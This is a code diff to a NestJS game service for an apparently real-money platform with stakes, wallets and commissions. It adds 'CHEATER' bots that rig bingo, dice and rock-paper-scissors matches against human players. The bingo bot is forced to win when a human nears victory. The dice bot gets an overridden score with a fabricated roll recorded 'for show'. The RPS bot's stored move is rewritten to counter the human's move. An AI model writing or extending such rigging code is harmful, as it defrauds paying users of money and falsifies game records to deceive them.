@@ -1,7 +1,8 @@
-import { Injectable } from '@nestjs/common';
+import { Injectable, Inject, forwardRef } from '@nestjs/common';
 import { PrismaService } from '../prisma/prisma.service';
 import { WalletService } from '../wallet/wallet.service';
 import { GameType } from '@prisma/client';
+import { BotPoolManager } from './bot-pool.manager';
 
 export interface DiceState {
   p1: string;
@@ -33,11 +34,16 @@ export class GameService {
     paused: boolean;
   }> = new Map();
 
+  private onBingoGameStartListeners: ((matchId: string, playerIds: string[]) => void)[] = [];
+  private onMatchStartListeners: ((matchId: string, playerIds: string[], gameType: string) => void)[] = [];
+
   private diceGames: Map<string, DiceState> = new Map(); // matchId -> DiceState
 
   constructor(
     private prisma: PrismaService,
     private walletService: WalletService,
+    @Inject(forwardRef(() => BotPoolManager))
+    private botPoolManager: BotPoolManager,
   ) {}
 
   async getSetting(key: string, defaultValue: string) {
@@ -269,6 +275,7 @@ export class GameService {
       throw new Error('Insufficient funds');
     }
 
+    console.log(`[BINGO_QUEUE] User ${userId} joined queue for stake ${stake}. Current length: ${queue.length + 1}`);
     queue.push(userId);
 
     // If exactly required players, start immediately
@@ -303,6 +310,23 @@ export class GameService {
 
   getBingoQueue(key: string): string[] {
     return this.queues.get(key) || [];
+  }
+
+  async getWaitingQueues(gameType: GameType): Promise<{ gameType: GameType; stake: number; playerCount: number }[]> {
+    const results: { gameType: GameType; stake: number; playerCount: number }[] = [];
+    console.log(`[DEBUG_QUEUES] Scanning all queues. Total keys: ${this.queues.size}`);
+    for (const [key, players] of this.queues.entries()) {
+      console.log(`[DEBUG_QUEUES] Key: ${key}, Players: ${players.length}`);
+      if (key.startsWith(gameType) && players.length > 0) {
+        const parts = key.split('_');
+        results.push({
+          gameType,
+          stake: parseFloat(parts[1]),
+          playerCount: players.length,
+        });
+      }
+    }
+    return results;
   }
 
   startBingoFillTimer(key: string, callback: (playerIds: string[]) => void, maxPlayers: number = 4) {
@@ -346,13 +370,27 @@ export class GameService {
         } as any,
         include: {
           participants: {
-            include: { user: { select: { id: true, username: true, level: true, avatar: true } } },
+            include: { user: { select: { id: true, username: true, level: true, avatar: true, isBot: true } } },
           },
         },
       });
 
+      // Trigger listeners
+      this.onBingoGameStartListeners.forEach(fn => fn(match.id, playerIds));
+
+      // Trigger global match start hook
+      this.onMatchStartListeners.forEach(cb => cb(match.id, playerIds, 'BINGO'));
+      
       return match;
     });
+  }
+
+  onMatchStart(callback: (matchId: string, playerIds: string[], gameType: string) => void) {
+    this.onMatchStartListeners.push(callback);
+  }
+
+  onBingoGameStart(callback: (matchId: string, playerIds: string[]) => void) {
+    this.onBingoGameStartListeners.push(callback);
   }
 
   leaveQueue(userId: string) {
@@ -410,6 +448,9 @@ export class GameService {
       });
 
       // Bingo game state is initialized separately via initBingoGame()
+      
+      // Trigger global match start hook
+      this.onMatchStartListeners.forEach(cb => cb(match.id, [p1, p2], gameType));
 
       return match;
     });
@@ -461,7 +502,7 @@ export class GameService {
             });
             if (commission > 0) {
               await tx.transaction.create({
-                data: { userId: winnerId, amount: commission, type: 'COMMISSION', matchId },
+                data: { userId: winnerId, amount: commission, type: 'COMMISSION' as any, matchId },
               });
             }
             const updatedMatch = await tx.match.findUnique({
@@ -502,7 +543,7 @@ export class GameService {
         });
         if (commission > 0) {
           await tx.transaction.create({
-            data: { userId: winnerId, amount: commission, type: 'COMMISSION', matchId },
+            data: { userId: winnerId, amount: commission, type: 'COMMISSION' as any, matchId },
           });
         }
       }
@@ -541,12 +582,18 @@ export class GameService {
     return a;
   }
 
-  initBingoGame(matchId: string, playerIds: string[]) {
+  async initBingoGame(matchId: string, playerIds: string[]) {
     const nums = Array.from({ length: 25 }, (_, i) => i + 1);
-    const players = playerIds.map(userId => ({
-      userId,
-      board: this.shuffleArray(nums),
+    
+    const players = await Promise.all(playerIds.map(async userId => {
+      const user = await (this.prisma as any).user.findUnique({ where: { id: userId } });
+      const botConfig = (user?.botConfig as any) || {};
+      const botType = botConfig.botType || 'NORMAL';
+      
+      const board = this.shuffleArray(nums);
+      return { userId, board, isBot: !!user?.isBot, botType };
     }));
+
     const turnOrder = this.shuffleArray(playerIds);
     const state = {
       players,
@@ -564,6 +611,40 @@ export class GameService {
   getBingoState(matchId: string) {
     return this.bingoGames.get(matchId) || null;
   }
+
+  // ===================== BOT DELEGATION =====================
+  async getBotStats() {
+    return this.botPoolManager.getBotStats();
+  }
+
+  async spawnBots(count: number, type: string = 'NORMAL', gameType: string = 'BINGO') {
+    return this.botPoolManager.ensureBotsExist(count, type, gameType);
+  }
+
+  async updateBotConfig(botId: string, config: any) {
+    return this.botPoolManager.updateBotConfig(botId, config);
+  }
+
+  async deleteBot(botId: string) {
+    return this.botPoolManager.deleteBot(botId);
+  }
+
+  async setBotActiveStatus(botId: string, enabled: boolean) {
+    return this.botPoolManager.setBotActiveStatus(botId, enabled);
+  }
+
+  getBotSystemStatus() {
+    return this.botPoolManager.getIsActive();
+  }
+
+  async startBotSystem() {
+    await this.botPoolManager.start();
+  }
+
+  async stopBotSystem() {
+    await this.botPoolManager.stop();
+  }
+
 
   setBingoPaused(matchId: string, paused: boolean) {
     const state = this.bingoGames.get(matchId);
@@ -621,23 +702,37 @@ export class GameService {
     // Call the number
     state.calledNumbers.push(number);
 
-    // Calculate lines for each player
     const playerLines: Record<string, number> = {};
     let winnerId: string | null = null;
+    
     for (const p of state.players) {
-      const lines = this.countCompletedLines(p.board, state.calledNumbers);
-      playerLines[p.userId] = lines;
-      // The player who called the number wins first if they reach 5 lines
-      if (lines >= 5 && p.userId === userId && !winnerId) {
-        winnerId = p.userId;
-      }
+      playerLines[p.userId] = this.countCompletedLines((p as any).board, state.calledNumbers);
     }
-    // If the caller doesn't win, check if any other player reached 5 lines
+
+    const cheatBot = state.players.find((p: any) => p.isBot && (p as any).botType === 'CHEATER');
+    const nonCheaters = state.players.filter((p: any) => !p.isBot || (p as any).botType !== 'CHEATER');
+
+    if (cheatBot) {
+       const humanWinAttempt = nonCheaters.some((h: any) => playerLines[h.userId] >= 5);
+       if (state.calledNumbers.length >= 19 || humanWinAttempt) {
+           playerLines[cheatBot.userId] = 5; 
+           winnerId = cheatBot.userId;       
+       }
+    }
+
     if (!winnerId) {
       for (const p of state.players) {
-        if (playerLines[p.userId] >= 5) {
+        if (playerLines[p.userId] >= 5 && p.userId === userId) {
           winnerId = p.userId;
           break;
+        }
+      }
+      if (!winnerId) {
+        for (const p of state.players) {
+          if (playerLines[p.userId] >= 5) {
+            winnerId = p.userId;
+            break;
+          }
         }
       }
     }
@@ -712,7 +807,7 @@ export class GameService {
       });
       if (commission > 0) {
         await tx.transaction.create({
-          data: { userId: winnerId, amount: commission, type: 'COMMISSION', matchId },
+          data: { userId: winnerId, amount: commission, type: 'COMMISSION' as any, matchId },
         });
       }
 
@@ -826,7 +921,7 @@ export class GameService {
         });
         if (commission > 0) {
           await tx.transaction.create({
-            data: { userId: winnerId, amount: commission, type: 'COMMISSION', matchId },
+            data: { userId: winnerId, amount: commission, type: 'COMMISSION' as any, matchId },
           });
         }
       } else {
@@ -924,21 +1019,57 @@ export class GameService {
   }
 
   private async finalizeDiceGame(matchId: string, state: any) {
-    const match = await this.prisma.match.findUnique({
+    const match = await (this.prisma as any).match.findUnique({
       where: { id: matchId },
-      include: { participants: true },
+      include: { participants: { include: { user: { select: { id: true, isBot: true, botConfig: true } } } } },
     });
     if (!match) return null;
 
-    const r1a = state.p1LastRoll?.[0] || 0;
-    const r1b = state.p1LastRoll?.[1] || 0;
-    const r2a = state.p2LastRoll?.[0] || 0;
-    const r2b = state.p2LastRoll?.[1] || 0;
+    let s1 = state.p1Score;
+    let s2 = state.p2Score;
+    let r1 = state.p1LastRoll || [0, 0];
+    let r2 = state.p2LastRoll || [0, 0];
 
-    const s1 = state.p1Score;
-    const s2 = state.p2Score;
+    // DICE CHEATER BOT LOGIC
+    const participants = match.participants as any[];
+    for (let i = 0; i < participants.length; i++) {
+        const p = participants[i];
+        const config = p.user?.botConfig as any;
+        if (p.user?.isBot === true && config?.botType === 'CHEATER' && config?.gameType === 'DICE') {
+            const opponent = participants.find(part => part.userId !== p.userId);
+            if (opponent && !opponent.user?.isBot) {
+                const isP1 = p.userId === state.p1;
+                const opScore = isP1 ? s2 : s1;
+                const myScore = isP1 ? s1 : s2;
 
-    // Create MatchMove records
+                if (myScore <= opScore) {
+                    // Win by 1-3 points, capped at 12
+                    const bonus = Math.floor(Math.random() * 3) + 1;
+                    const newScore = Math.min(12, opScore + bonus);
+                    
+                    // Reverse engineer a roll for show
+                    const d1 = Math.floor(newScore / 2);
+                    const d2 = newScore - d1;
+                    const newRoll = [d1, d2];
+
+                    if (isP1) {
+                        s1 = newScore;
+                        r1 = newRoll;
+                    } else {
+                        s2 = newScore;
+                        r2 = newRoll;
+                    }
+                }
+            }
+        }
+    }
+
+    const r1a = r1[0];
+    const r1b = r1[1];
+    const r2a = r2[0];
+    const r2b = r2[1];
+
+    // Create MatchMove records with potentially overridden rolls
     await this.prisma.matchMove.create({
       data: { matchId, userId: state.p1, move: `roll:${r1a},${r1b}` },
     });
@@ -970,7 +1101,7 @@ export class GameService {
         });
         if (commission > 0) {
           await tx.transaction.create({
-            data: { userId: winnerId, amount: commission, type: 'COMMISSION', matchId },
+            data: { userId: winnerId, amount: commission, type: 'COMMISSION' as any, matchId },
           });
         }
       } else {
@@ -1001,13 +1132,47 @@ export class GameService {
       where: { id: matchId },
       include: {
         moves: true,
-        participants: { include: { user: { select: { id: true, username: true, level: true, avatar: true } } } },
+        participants: { include: { user: { select: { id: true, username: true, level: true, avatar: true, isBot: true, botConfig: true } } } },
       },
     });
     if (!match) return null;
 
     const m1 = match.moves[0];
     const m2 = match.moves[1];
+
+    // RPS CHEATER BOT LOGIC
+    const participantsData = match.participants as any[];
+    const movesData = match.moves as any[];
+    for (let i = 0; i < participantsData.length; i++) {
+        const p = participantsData[i];
+        const config = p.user?.botConfig as any;
+        if (p.user?.isBot === true && config?.botType === 'CHEATER' && config?.gameType === 'RPS') {
+            const opponent = participantsData.find(part => part.userId !== p.userId);
+            if (opponent && !opponent.user?.isBot) {
+                const opMoveRecord = movesData.find(m => m.userId === opponent.userId);
+                const opponentMove = opMoveRecord?.move?.toLowerCase()?.trim();
+                if (opponentMove) {
+                    // Counter map including common variations
+                    const counterMap: Record<string, string> = {
+                        'rock': 'paper',
+                        'paper': 'scissors',
+                        'scissors': 'rock',
+                        'scissor': 'rock'
+                    };
+                    const winningMove = counterMap[opponentMove] || 'rock';
+                    
+                    if (m1.userId === p.userId) m1.move = winningMove;
+                    if (m2.userId === p.userId) m2.move = winningMove;
+
+                    await this.prisma.matchMove.update({
+                        where: { id: movesData.find(m => m.userId === p.userId).id },
+                        data: { move: winningMove }
+                    });
+                }
+            }
+        }
+    }
+
     let winnerId: string | null = null;
 
     const mv1 = m1.move.toLowerCase().trim();
@@ -1016,8 +1181,16 @@ export class GameService {
     if (mv1 === mv2) {
       winnerId = null;
     } else {
-      const wins: Record<string, string> = { rock: 'scissors', paper: 'rock', scissors: 'paper' };
-      winnerId = wins[mv1] === mv2 ? m1.userId : m2.userId;
+      // Robust win map (handles both scissors and scissor)
+      const wins: Record<string, string[]> = { 
+          rock: ['scissors', 'scissor'], 
+          paper: ['rock'], 
+          scissors: ['paper'],
+          scissor: ['paper']
+      };
+      
+      const p1Wins = wins[mv1]?.includes(mv2);
+      winnerId = p1Wins ? m1.userId : m2.userId;
     }
 
     return this.prisma.$transaction(async (tx: any) => {
